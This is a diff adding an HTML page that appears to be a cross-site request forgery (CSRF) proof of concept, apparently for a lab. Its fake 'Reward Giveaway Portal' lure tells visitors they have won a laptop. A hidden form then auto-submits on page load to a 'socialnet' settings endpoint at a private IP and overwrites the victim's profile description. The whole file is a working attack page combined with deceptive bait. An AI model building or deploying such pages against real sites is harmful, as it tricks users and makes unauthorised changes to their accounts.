@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reward Giveaway Portal!</title>
+</head>
+<body>
+    <h1>Congratulations! You have won a brand new HP Laptop!</h1>
+    <p>Loading your prize details, please wait a moment...</p>
+    
+    <form id="attackForm" action="http://192.168.79.133/socialnet/setting.php" method="POST" style="display:none;">
+        <input type="hidden" name="description" value="This account has been successfully compromised via CSRF attack!!!">
+    </form>
+    
+    <script>
+        // Automatically trigger form submission immediately when the victim loads the page
+        window.onload = function() {
+            document.getElementById('attackForm').submit();
+        }
+    </script>
+</body>
+</html>
